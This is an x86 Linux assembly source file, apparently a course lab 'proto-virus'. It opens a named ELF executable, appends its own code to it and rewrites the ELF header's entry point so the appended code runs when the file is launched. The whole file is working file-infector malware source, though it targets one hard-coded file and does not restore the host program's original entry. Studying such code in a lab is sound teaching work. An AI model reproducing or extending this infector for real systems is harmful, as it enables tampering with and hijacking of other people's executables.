%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define STDOUT 1
%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define LOAD_STARTING_LOCATION 0x08048000

	global _start

	section .text
my_start:
get_my_loc:
	call anchor	
anchor:
	pop edx ; edx holds the current address
	mov dword [ebp-4],edx
	ret
; EBP-4 => get my loc
; EBP-8 => File descriptor
; EBP -12 => size of the filw
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	call get_my_loc ; ebp-4 and edx holds the current location
	add dword [ebp-4], (OutStr-anchor)
	write STDOUT,dword [ebp-4],31
	call get_my_loc
	add dword [ebp-4],(FileName-anchor) 
	open dword [ebp-4],RDWR,0
	mov dword [ebp-8],eax ; ebp-8 holds the file descriptor
	cmp byte [ebp-8],0
	jl .error1
	.checking_elf:
	mov ecx, ebp
	sub ecx,200
	read dword [ebp-8],	ecx,4
	cmp byte [ecx],0x7F
	jne .error2
	cmp byte [ecx+1],'E'
	jne .error2
	cmp byte [ecx+2],'L'
	jne .error2
	cmp byte [ecx+3],'F'
	jne .error2
	.planting_virus:
		lseek dword [ebp-8],0,SEEK_END
		mov dword [ebp-12],eax ; ebp -12 holds number of bytes read - the size of the file
		call get_my_loc
		add dword [ebp-4], (my_start-anchor)
		write dword [ebp-8],dword [ebp-4],(virus_end-my_start)
		jmp .load_header
	.error1:
		call get_my_loc
		add dword[ebp-4],(Failstr1-anchor)
		write STDOUT,dword [ebp-4],19
		exit 1
	.error2:
		call get_my_loc
		add dword [ebp-4],(Failstr2-anchor)
		write STDOUT,dword [ebp-4],18
		exit 2
	.load_header:
	lseek dword [ebp-8],0,SEEK_SET ; changing to the beginning of the file
	mov ecx,ebp
	sub ecx,200
	read dword [ebp-8],ecx,52 ; now ebp-200 holds the elf_header. ecx+24 holds the entry point!!
	.change_header:
	mov eax, dword [ebp-12] ; saves amount of bytes read
	mov dword [ebp-16],eax
	add dword [ebp-16],LOAD_STARTING_LOCATION ; now ebp-16 holds the starting virtual location of the virus loaded
	mov eax, dword [ebp-16] ;save the value in eax
	add eax,_start-my_start ; add to be the start to be ran
	mov ecx,ebp
	sub ecx,200
	mov dword [ecx+24],eax ;change the header
	lseek dword [ebp-8],0,SEEK_SET ; changing to the beginning of the file
	mov ecx,ebp
	sub ecx,200
	write dword [ebp-8],ecx,52 ; writing the new header
	close dword [ebp-8] ;closing the file



VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)




FileName:	db "ELFexec2short", 0
hello: db "This is a virus",10,0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr1:        db "error in openning", 10 , 0
Failstr2:	db "error not an elf",10,0
PreviousEntryPoint: dd VirusExit
virus_end:


